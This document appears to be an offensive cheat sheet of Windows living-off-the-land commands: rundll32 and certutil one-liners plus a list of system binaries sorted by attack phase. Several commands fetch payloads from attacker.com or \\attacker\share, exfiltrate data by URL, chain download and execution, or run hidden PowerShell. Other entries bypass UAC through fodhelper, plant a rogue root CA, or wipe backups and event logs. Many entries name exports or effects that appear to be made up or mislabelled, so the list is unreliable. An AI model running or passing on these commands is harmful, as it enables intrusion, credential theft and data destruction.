
1. Execute JavaScript/VBScript via MSHTA engine:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("wscript.shell.run('calc')")

2. Execute remote HTA (bypass SmartScreen):
   rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta

3. Invoke shellcode via ShellExecute:
   rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe

4. Open Control Panel item:
   rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl

5. Execute DLL export function:
   rundll32.exe mydll.dll,ExportedFunction

6. Launch Control Panel Internet settings:
   rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl

7. Trigger UAC popup via fodhelper (indirect persistence):
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
   rundll32.exe shell32.dll,Control_RunDLL fodhelper.exe

8. Load library with malicious side-effects:
   rundll32.exe advapi32.dll,StartServiceCtrlDispatcherA

9. Network share authentication capture:
   rundll32.exe netshell.dll,StartNetConnectionDialog 127.0.0.1

10. Trigger scheduled task:
    rundll32.exe taskschd.dll,LaunchAdvancedTask

11. In-memory PowerShell payload:
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -e <base64>')")

12. Bypass AppLocker via DLL sideloading:
    rundll32.exe .\sideload.dll,Main

13. Run with elevated token:
    rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl

14. Add user silently via backdoor DLL:
    rundll32.exe user32.dll,CreateUser

15. Trigger credential UI:
    rundll32.exe keymgr.dll,KRShowKeyMgr

16. Load COM object (DLL hijack vector):
    rundll32.exe comsvcs.dll,MiniDump

17. Trigger biometric prompt (distraction technique):
    rundll32.exe biometricPrompt.dll,PromptUser

18. Load and execute VBScript:
    rundll32.exe vbscript.dll,VBScriptMain

19. Call URLDownloadToFile via rundll32:
    rundll32.exe urlmon.dll,URLDownloadToFileA

20. Trigger Group Policy refresh:
    rundll32.exe gpedit.dll,LaunchGPE

21. Load explorer shell extension (DLL backdoor):
    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL

22. Invoke open/save dialog:
    rundll32.exe comdlg32.dll,ShowOpenSaveDialog

23. Infiltrate via CLSID execution:
    rundll32.exe advpack.dll,LaunchINFSection

24. Trigger CLSID DLL with malicious registry redirection:
    rundll32.exe dfshim.dll,ShOpenVerbApplication

25. Use Sxs.dll to run embedded manifest payload:
    rundll32.exe sxs.dll,CreateAssemblyCacheItem

26. AutoPlay prompt abuse:
    rundll32.exe shell32.dll,SHInvokePrinterCommand

27. Access network printer dialog (trigger UNC auth):
    rundll32.exe printui.dll,PrintUIEntry

28. Trigger shell popup for lure:
    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter

29. Run IE-specific shell:
    rundll32.exe ieframe.dll,LaunchBrowser

30. Run network setup wizard:
    rundll32.exe netplwiz.dll,NetplwizRunDll

31. Load Windows update configuration GUI:
    rundll32.exe wuapi.dll,ShowWindowsUpdate

32. Run Disk Cleanup:
    rundll32.exe cleanmgr.dll,LaunchDiskCleanup




### ðŸ”¹ **Execution & Payload Delivery**
- `mshta.exe` â€“ Execute remote HTA/VBScript payloads.
- `rundll32.exe` â€“ Run DLLs and JavaScript-based COM objects in memory.
- `regsvr32.exe` â€“ Execute remote scripts/DLLs using scriptlet loading.
- `powershell.exe` â€“ Core script execution, fileless payload loading.
- `msiexec.exe` â€“ Install and execute remote MSI payloads.
- `cmd.exe` â€“ Generic script/command execution.
- `wscript.exe` / `cscript.exe` â€“ VBScript/JS-based execution.
- `certutil.exe` â€“ Download payloads or decode base64-encoded files.

---

### ðŸ”¹ **Persistence & Scheduled Execution**
- `schtasks.exe` â€“ Create scheduled tasks for persistence.
- `wmic.exe` â€“ Execute commands and lateral movement via WMI.
- `eventvwr.exe` â€“ UAC bypass via hijacked registry keys.
- `fodhelper.exe` â€“ UAC bypass via auto-elevated binary.



### ðŸ”¹ **Privilege Escalation & Credential Access**
- `dllhost.exe` â€“ DLL hijacking/COM hijacking.
- `slui.exe` â€“ Another UAC bypass vector.
- `sdclt.exe` â€“ Abused for arbitrary command execution and privilege escalation.
- `taskmgr.exe` â€“ Can load malicious DLLs when hijacked.

### ðŸ”¹ **Lateral Movement**
- `psexec.exe` â€“ Remote command execution (Red Team favorite).
- `winrm.vbs` â€“ PowerShell Remoting helper.
- `wmic.exe` â€“ Cross-network process creation via WMI.

### ðŸ”¹ **Impact â€“ Data Destruction / Anti-Forensics**
- `cipher.exe` â€“ Securely delete files and wipe disk space.
- `vssadmin.exe` â€“ Delete volume shadow copies (anti-backup).
- `wbadmin.exe` â€“ Delete backup catalogs.
- `bcdedit.exe` â€“ Disable recovery options.
- `wevtutil.exe` â€“ Clear event logs.
- `shutdown.exe` â€“ Reboot/shutdown system post-attack.
- `fsutil.exe` â€“ Manipulate file system behaviors or drive states.


1. Download file via HTTP:
   certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

2. Encode file to base64:
   certutil -encode payload.exe payload.txt

3. Decode base64 to binary:
   certutil -decode payload.txt payload.exe

4. View certificate store:
   certutil -store My

5. Extract public key from cert:
   certutil -store -user My > pubkey.pem

6. Create a dummy cert:
   certutil -user -addstore Root dummycert.cer

7. Dump certificate revocation list:
   certutil -url dummycert.cer

8. Encode script to base64 for PowerShell:
   certutil -encode script.ps1 encoded.txt

9. Create malicious INF file and sign:
   certutil -addstore TrustedPublisher malicious.cer

10. Verify signature on payload:
    certutil -verify payload.exe

11. Abuse for living-off-the-land download (LOLBAS):
    certutil -urlcache -split -f http://attacker.com/evil.ps1 evil.ps1

12. Convert cert to Base64 DER format:
    certutil -encode cert.cer cert_base64.txt

13. Convert Base64 cert back to binary:
    certutil -decode cert_base64.txt cert_decoded.cer

14. Generate random file (for AV evasion):
    certutil -generateSSTFromWU legitfile.sst

15. Download via UNC path (trigger auth):
    certutil -urlcache -split -f \\attacker\share\payload.exe payload.exe

16. Validate cert chain (OSINT evasion):
    certutil -urlfetch -verify malicious.exe

17. Dump system store:
    certutil -user -store -enterprise

18. Harvest certs from other users (if elevated):
    certutil -user -store -pfx

19. Use certutil to ping (time-based exfil):
    certutil -urlcache -f http://attacker.com/`date /t`

20. Sign payload (masquerade legitimacy):
    certutil -sign payload.exe signer.cer signed_payload.exe

21. Overwrite trusted store with custom CA:
    certutil -addstore -enterprise -f Root attackerCA.cer

22. Harvest CA trust list:
    certutil -viewstore -enterprise CA

23. Enumerate smart card certs:
    certutil -scinfo

24. Force revocation check (side-channel leak):
    certutil -verify -urlfetch malicious.cer

25. Check installed root CAs:
    certutil -store root

26. List templates (target cert abuse):
    certutil -template

27. Abuse certutil to rename files:
    certutil -encode malware.exe newname.txt && ren newname.txt malware.exe

28. Encode PowerShell dropper:
    certutil -encode dropper.ps1 encoded.txt

29. Decode obfuscated payload:
    certutil -decode encoded_payload.txt stage2.exe

30. Chain with rundll32 for delivery:
    certutil -urlcache -split -f http://evil/payload.dll && rundll32 payload.dll,Entry

31. Auto-persist a dropped cert for UAC bypass:
    certutil -addstore Root persist.cer

32. Bypass detection with alternate data stream:
    certutil -urlcache -split -f http://attacker.com/evil.exe C:\temp\legit.exe:evil

